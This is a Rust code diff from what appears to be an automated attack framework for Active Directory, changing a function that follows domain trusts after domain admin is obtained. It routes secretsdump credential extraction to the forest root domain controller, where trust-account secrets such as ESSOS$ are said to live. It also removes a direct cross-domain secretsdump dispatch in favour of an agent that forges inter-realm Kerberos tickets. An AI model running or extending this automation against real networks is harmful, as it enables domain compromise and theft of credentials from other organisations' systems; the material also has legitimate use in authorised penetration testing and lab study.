@@ -156,7 +156,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                     .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                     .await;
                             }
-                            Ok(None) => {}
+                            Ok(None) => {
+                                debug!(domain = %domain, "Trust enum throttled — deferred");
+                            }
                             Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
                         }
                     }
@@ -383,6 +385,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             if state.has_domain_admin && !state.trusted_domains.is_empty() {
                 // Collect trust work with per-trust source domain:
                 // use a dominated domain that has a known DC (excluding the trust target).
+                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. ESSOS$)
+                // live on the forest root DC, not child domain DCs. A secretsdump with
+                // -just-dc-user ESSOS$ against a child DC returns nothing.
                 let extract_work: Vec<(String, String, String, String, String)> = state
                     .trusted_domains
                     .values()
@@ -392,14 +397,17 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                             return None;
                         }
-                        // Find a DC in a dominated source domain (not the foreign trust target)
+                        // Find a DC in a dominated source domain (not the foreign trust target).
+                        // Prefer the forest root (fewest domain parts) since trust accounts
+                        // are stored on the forest root DC.
                         let (source_domain, dc_ip) = state
                             .domain_controllers
                             .iter()
-                            .find(|(domain, _)| {
+                            .filter(|(domain, _)| {
                                 domain.to_lowercase() != trust.domain.to_lowercase()
                                     && state.dominated_domains.contains(&domain.to_lowercase())
                             })
+                            .min_by_key(|(domain, _)| domain.split('.').count())
                             .map(|(d, ip)| (d.clone(), ip.clone()))?;
                         Some((
                             key,
@@ -750,32 +758,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 }
             }
 
-            // 2. If we know the target DC, dispatch secretsdump against it
-            if let Some(ref dc_ip) = item.target_dc_ip {
-                let sd_payload = json!({
-                    "technique": "secretsdump",
-                    "target_ip": dc_ip,
-                    "domain": item.target_domain,
-                    "trust_account": item.hash.username,
-                    "trust_key": item.hash.hash_value,
-                });
-
-                match dispatcher
-                    .throttled_submit("credential_access", "credential_access", sd_payload, 2)
-                    .await
-                {
-                    Ok(Some(task_id)) => {
-                        info!(
-                            task_id = %task_id,
-                            target_dc = %dc_ip,
-                            target_domain = %item.target_domain,
-                            "Cross-domain secretsdump dispatched"
-                        );
-                    }
-                    Ok(None) => {}
-                    Err(e) => warn!(err = %e, "Failed to dispatch cross-domain secretsdump"),
-                }
-            }
+            // The privesc agent handles the full flow: forge inter-realm ticket →
+            // secretsdump_kerberos against the target DC.  No separate credential_access
+            // dispatch needed (it lacked valid auth and always failed).
 
             // Mark as processed
             dispatcher
